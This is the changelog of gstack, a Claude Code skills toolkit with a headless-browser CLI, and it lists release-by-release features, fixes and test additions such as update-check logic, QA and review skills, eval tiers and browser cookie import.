- **`bin/gstack-config` CLI**. simple get/set/list interface for `~/.gstack/config.yaml`. Used by update-check and upgrade skill for persistent settings (auto_upgrade, update_check).
- **Smart update check**. 12h cache TTL (was 24h), exponential snooze backoff (24h → 48h → 1 week) when user declines upgrades, `update_check: false` config option to disable checks entirely. Snooze resets when a new version is released.
- **Auto-upgrade mode**. set `auto_upgrade: true` in config or `GSTACK_AUTO_UPGRADE=1` env var to skip the upgrade prompt and update automatically.
- **4-option upgrade prompt**. "Yes, upgrade now", "Always keep me up to date", "Not now" (snooze), "Never ask again" (disable).
- **Vendored copy sync**. `/gstack-upgrade` now detects and updates local vendored copies in the current project after upgrading the primary install.
- 25 new tests: 11 for gstack-config CLI, 14 for snooze/config paths in update-check.

### Changed
- README upgrade/troubleshooting sections simplified to reference `/gstack-upgrade` instead of long paste commands.
- Upgrade skill template bumped to v1.1.0 with `Write` tool permission for config editing.
- All SKILL.md preambles updated with new upgrade flow description.

## 0.3.8. 2026-03-14

### Added
- **TODOS.md as single source of truth**. merged `TODO.md` (roadmap) and `TODOS.md` (near-term) into one file organized by skill/component with P0-P4 priority ordering and a Completed section.
- **`/ship` Step 5.5: TODOS.md management**. auto-detects completed items from the diff, marks them done with version annotations, offers to create/reorganize TODOS.md if missing or unstructured.
- **Cross-skill TODOS awareness**. `/plan-ceo-review`, `/plan-eng-review`, `/retro`, `/review`, and `/qa` now read TODOS.md for project context. `/retro` adds Backlog Health metric (open counts, P0/P1 items, churn).
- **Shared `review/TODOS-format.md`**. canonical TODO item format referenced by `/ship` and `/plan-ceo-review` to prevent format drift (DRY).
- **Greptile 2-tier reply system**. Tier 1 (friendly, inline diff + explanation) for first responses; Tier 2 (firm, full evidence chain + re-rank request) when Greptile re-flags after a prior reply.
- **Greptile reply templates**. structured templates in `greptile-triage.md` for fixes (inline diff), already-fixed (what was done), and false positives (evidence + suggested re-rank). Replaces vague one-line replies.
- **Greptile escalation detection**. explicit algorithm to detect prior GStack replies on comment threads and auto-escalate to Tier 2.
- **Greptile severity re-ranking**. replies now include `**Suggested re-rank:**` when Greptile miscategorizes issue severity.
- Static validation tests for `TODOS-format.md` references across skills.

### Fixed
- **`.gitignore` append failures silently swallowed**. `ensureStateDir()` bare `catch {}` replaced with ENOENT-only silence; non-ENOENT errors (EACCES, ENOSPC) logged to `.gstack/browse-server.log`.

### Changed
- `TODO.md` deleted. all items merged into `TODOS.md`.
- `/ship` Step 3.75 and `/review` Step 5 now reference reply templates and escalation detection from `greptile-triage.md`.
- `/ship` Step 6 commit ordering includes TODOS.md in the final commit alongside VERSION + CHANGELOG.
- `/ship` Step 8 PR body includes TODOS section.

## 0.3.7. 2026-03-14

### Added
- **Screenshot element/region clipping**. `screenshot` command now supports element crop via CSS selector or @ref (`screenshot "#hero" out.png`, `screenshot @e3 out.png`), region clip (`screenshot --clip x,y,w,h out.png`), and viewport-only mode (`screenshot --viewport out.png`). Uses Playwright's native `locator.screenshot()` and `page.screenshot({ clip })`. Full page remains the default.
- 10 new tests covering all screenshot modes (viewport, CSS, @ref, clip) and error paths (unknown flag, mutual exclusion, invalid coords, path validation, nonexistent selector).

## 0.3.6. 2026-03-14

### Added
- **E2E observability**. heartbeat file (`~/.gstack-dev/e2e-live.json`), per-run log directory (`~/.gstack-dev/e2e-runs/{runId}/`), progress.log, per-test NDJSON transcripts, persistent failure transcripts. All I/O non-fatal.
- **`bun run eval:watch`**. live terminal dashboard reads heartbeat + partial eval file every 1s. Shows completed tests, current test with turn/tool info, stale detection (>10min), `--tail` for progress.log.
- **Incremental eval saves**. `savePartial()` writes `_partial-e2e.json` after each test completes. Crash-resilient: partial results survive killed runs. Never cleaned up.
- **Machine-readable diagnostics**. `exit_reason`, `timeout_at_turn`, `last_tool_call` fields in eval JSON. Enables `jq` queries for automated fix loops.
- **API connectivity pre-check**. E2E suite throws immediately on ConnectionRefused before burning test budget.
- **`is_error` detection**. `claude -p` can return `subtype: "success"` with `is_error: true` on API failures. Now correctly classified as `error_api`.
- **Stream-json NDJSON parser**. `parseNDJSON()` pure function for real-time E2E progress from `claude -p --output-format stream-json --verbose`.
- **Eval persistence**. results saved to `~/.gstack-dev/evals/` with auto-comparison against previous run.
- **Eval CLI tools**. `eval:list`, `eval:compare`, `eval:summary` for inspecting eval history.
- **All 9 skills converted to `.tmpl` templates**. plan-ceo-review, plan-eng-review, retro, review, ship now use `{{UPDATE_CHECK}}` placeholder. Single source of truth for update check preamble.
- **3-tier eval suite**. Tier 1: static validation (free), Tier 2: E2E via `claude -p` (~$3.85/run), Tier 3: LLM-as-judge (~$0.15/run). Gated by `EVALS=1`.
- **Planted-bug outcome testing**. eval fixtures with known bugs, LLM judge scores detection.
- 15 observability unit tests covering heartbeat schema, progress.log format, NDJSON naming, savePartial, finalize, watcher rendering, stale detection, non-fatal I/O.
- E2E tests for plan-ceo-review, plan-eng-review, retro skills.
- Update-check exit code regression tests.
- `test/helpers/skill-parser.ts`. `getRemoteSlug()` for git remote detection.

### Fixed
- **Browse binary discovery broken for agents**. replaced `find-browse` indirection with explicit `browse/dist/browse` path in SKILL.md setup blocks.
- **Update check exit code 1 misleading agents**. added `|| true` to prevent non-zero exit when no update available.
- **browse/SKILL.md missing setup block**. added `{{BROWSE_SETUP}}` placeholder.
- **plan-ceo-review timeout**. init git repo in test dir, skip codebase exploration, bump timeout to 420s.
- Planted-bug eval reliability. simplified prompts, lowered detection baselines, resilient to max_turns flakes.

### Changed
- **Template system expanded**. `{{UPDATE_CHECK}}` and `{{BROWSE_SETUP}}` placeholders in `gen-skill-docs.ts`. All browse-using skills generate from single source of truth.
- Enriched 14 command descriptions with specific arg formats, valid values, error behavior, and return types.
- Setup block checks workspace-local path first (for development), falls back to global install.
- LLM eval judge upgraded from Haiku to Sonnet 4.6.
- `generateHelpText()` auto-generated from COMMAND_DESCRIPTIONS (replaces hand-maintained help text).

## 0.3.3. 2026-03-13

### Added
- **SKILL.md template system**. `.tmpl` files with `{{COMMAND_REFERENCE}}` and `{{SNAPSHOT_FLAGS}}` placeholders, auto-generated from source code at build time. Structurally prevents command drift between docs and code.
- **Command registry** (`browse/src/commands.ts`). single source of truth for all browse commands with categories and enriched descriptions. Zero side effects, safe to import from build scripts and tests.
- **Snapshot flags metadata** (`SNAPSHOT_FLAGS` array in `browse/src/snapshot.ts`). metadata-driven parser replaces hand-coded switch/case. Adding a flag in one place updates the parser, docs, and tests.
- **Tier 1 static validation**. 43 tests: parses `$B` commands from SKILL.md code blocks, validates against command registry and snapshot flag metadata
- **Tier 2 E2E tests** via Agent SDK. spawns real Claude sessions, runs skills, scans for browse errors. Gated by `SKILL_E2E=1` env var (~$0.50/run)
- **Tier 3 LLM-as-judge evals**. Haiku scores generated docs on clarity/completeness/actionability (threshold ≥4/5), plus regression test vs hand-maintained baseline. Gated by `ANTHROPIC_API_KEY`
- **`bun run skill:check`**. health dashboard showing all skills, command counts, validation status, template freshness
- **`bun run dev:skill`**. watch mode that regenerates and validates SKILL.md on every template or source file change
- **CI workflow** (`.github/workflows/skill-docs.yml`). runs `gen:skill-docs` on push/PR, fails if generated output differs from committed files
- `bun run gen:skill-docs` script for manual regeneration
- `bun run test:eval` for LLM-as-judge evals
- `test/helpers/skill-parser.ts`. extracts and validates `$B` commands from Markdown
- `test/helpers/session-runner.ts`. Agent SDK wrapper with error pattern scanning and transcript saving
- **ARCHITECTURE.md**. design decisions document covering daemon model, security, ref system, logging, crash recovery
- **Conductor integration** (`conductor.json`). lifecycle hooks for workspace setup/teardown
- **`.env` propagation**. `bin/dev-setup` copies `.env` from main worktree into Conductor workspaces automatically
- `.env.example` template for API key configuration

### Changed
- Build now runs `gen:skill-docs` before compiling binaries
- `parseSnapshotArgs` is metadata-driven (iterates `SNAPSHOT_FLAGS` instead of switch/case)
- `server.ts` imports command sets from `commands.ts` instead of declaring inline
- SKILL.md and browse/SKILL.md are now generated files (edit the `.tmpl` instead)

## 0.3.2. 2026-03-13

### Fixed
- Cookie import picker now returns JSON instead of HTML. `jsonResponse()` referenced `url` out of scope, crashing every API call
- `help` command routed correctly (was unreachable due to META_COMMANDS dispatch ordering)
- Stale servers from global install no longer shadow local changes. removed legacy `~/.claude/skills/gstack` fallback from `resolveServerScript()`
- Crash log path references updated from `/tmp/` to `.gstack/`

### Added
- **Diff-aware QA mode**. `/qa` on a feature branch auto-analyzes `git diff`, identifies affected pages/routes, detects the running app on localhost, and tests only what changed. No URL needed.
- **Project-local browse state**. state file, logs, and all server state now live in `.gstack/` inside the project root (detected via `git rev-parse --show-toplevel`). No more `/tmp` state files.
- **Shared config module** (`browse/src/config.ts`). centralizes path resolution for CLI and server, eliminates duplicated port/state logic
- **Random port selection**. server picks a random port 10000-60000 instead of scanning 9400-9409. No more CONDUCTOR_PORT magic offset. No more port collisions across workspaces.
- **Binary version tracking**. state file includes `binaryVersion` SHA; CLI auto-restarts the server when the binary is rebuilt
- **Legacy /tmp cleanup**. CLI scans for and removes old `/tmp/browse-server*.json` files, verifying PID ownership before sending signals
- **Greptile integration**. `/review` and `/ship` fetch and triage Greptile bot comments; `/retro` tracks Greptile batting average across weeks
- **Local dev mode**. `bin/dev-setup` symlinks skills from the repo for in-place development; `bin/dev-teardown` restores global install
- `help` command. agents can self-discover all commands and snapshot flags
- Version-aware `find-browse` with META signal protocol. detects stale binaries and prompts agents to update
- `browse/dist/find-browse` compiled binary with git SHA comparison against origin/main (4hr cached)
- `.version` file written at build time for binary version tracking
- Route-level tests for cookie picker (13 tests) and find-browse version check (10 tests)
- Config resolution tests (14 tests) covering git root detection, BROWSE_STATE_FILE override, ensureStateDir, readVersionHash, resolveServerScript, and version mismatch detection
- Browser interaction guidance in CLAUDE.md. prevents Claude from using mcp\_\_claude-in-chrome\_\_\* tools
- CONTRIBUTING.md with quick start, dev mode explanation, and instructions for testing branches in other repos

### Changed
- State file location: `.gstack/browse.json` (was `/tmp/browse-server.json`)
- Log files location: `.gstack/browse-{console,network,dialog}.log` (was `/tmp/browse-*.log`)
- Atomic state file writes: `.json.tmp` → rename (prevents partial reads)
- CLI passes `BROWSE_STATE_FILE` to spawned server (server derives all paths from it)
- SKILL.md setup checks parse META signals and handle `META:UPDATE_AVAILABLE`
- `/qa` SKILL.md now describes four modes (diff-aware, full, quick, regression) with diff-aware as the default on feature branches
- `jsonResponse`/`errorResponse` use options objects to prevent positional parameter confusion
- Build script compiles both `browse` and `find-browse` binaries, cleans up `.bun-build` temp files
- README updated with Greptile setup instructions, diff-aware QA examples, and revised demo transcript

### Removed
- `CONDUCTOR_PORT` magic offset (`browse_port = CONDUCTOR_PORT - 45600`)
- Port scan range 9400-9409
- Legacy fallback to `~/.claude/skills/gstack/browse/src/server.ts`
- `DEVELOPING_GSTACK.md` (renamed to CONTRIBUTING.md)

## 0.3.1. 2026-03-12

### Phase 3.5: Browser cookie import

- `cookie-import-browser` command. decrypt and import cookies from real Chromium browsers (Comet, Chrome, Arc, Brave, Edge)
- Interactive cookie picker web UI served from the browse server (dark theme, two-panel layout, domain search, import/remove)
- Direct CLI import with `--domain` flag for non-interactive use
- `/setup-browser-cookies` skill for Claude Code integration
- macOS Keychain access with async 10s timeout (no event loop blocking)
- Per-browser AES key caching (one Keychain prompt per browser per session)
- DB lock fallback: copies locked cookie DB to /tmp for safe reads
- 18 unit tests with encrypted cookie fixtures

## 0.3.0. 2026-03-12

### Phase 3: /qa skill. systematic QA testing

- New `/qa` skill with 6-phase workflow (Initialize, Authenticate, Orient, Explore, Document, Wrap up)
- Three modes: full (systematic, 5-10 issues), quick (30-second smoke test), regression (compare against baseline)
- Issue taxonomy: 7 categories, 4 severity levels, per-page exploration checklist
- Structured report template with health score (0-100, weighted across 7 categories)
- Framework detection guidance for Next.js, Rails, WordPress, and SPAs
- `browse/bin/find-browse`. DRY binary discovery using `git rev-parse --show-toplevel`

### Phase 2: Enhanced browser

- Dialog handling: auto-accept/dismiss, dialog buffer, prompt text support
- File upload: `upload <sel> <file1> [file2...]`
- Element state checks: `is visible|hidden|enabled|disabled|checked|editable|focused <sel>`
- Annotated screenshots with ref labels overlaid (`snapshot -a`)
- Snapshot diffing against previous snapshot (`snapshot -D`)
- Cursor-interactive element scan for non-ARIA clickables (`snapshot -C`)
- `wait --networkidle` / `--load` / `--domcontentloaded` flags
- `console --errors` filter (error + warning only)
- `cookie-import <json-file>` with auto-fill domain from page URL
- CircularBuffer O(1) ring buffer for console/network/dialog buffers
- Async buffer flush with Bun.write()
- Health check with page.evaluate + 2s timeout
- Playwright error wrapping. actionable messages for AI agents
- Context recreation preserves cookies/storage/URLs (useragent fix)
- SKILL.md rewritten as QA-oriented playbook with 10 workflow patterns
- 166 integration tests (was ~63)

## 0.0.2. 2026-03-12

- Fix project-local `/browse` installs. compiled binary now resolves `server.ts` from its own directory instead of assuming a global install exists
- `setup` rebuilds stale binaries (not just missing ones) and exits non-zero if the build fails
- Fix `chain` command swallowing real errors from write commands (e.g. navigation timeout reported as "Unknown meta command")
- Fix unbounded restart loop in CLI when server crashes repeatedly on the same command
- Cap console/network buffers at 50k entries (ring buffer) instead of growing without bound
- Fix disk flush stopping silently after buffer hits the 50k cap
- Fix `ln -snf` in setup to avoid creating nested symlinks on upgrade
- Use `git fetch && git reset --hard` instead of `git pull` for upgrades (handles force-pushes)
- Simplify install: global-first with optional project copy (replaces submodule approach)
- Restructured README: hero, before/after, demo transcript, troubleshooting section
- Six skills (added `/retro`)

## 0.0.1. 2026-03-11

Initial release.

- Five skills: `/plan-ceo-review`, `/plan-eng-review`, `/review`, `/ship`, `/browse`
- Headless browser CLI with 40+ commands, ref-based interaction, persistent Chromium daemon
- One-command install as Claude Code skills (submodule or global clone)
- `setup` script for binary compilation and skill symlinking
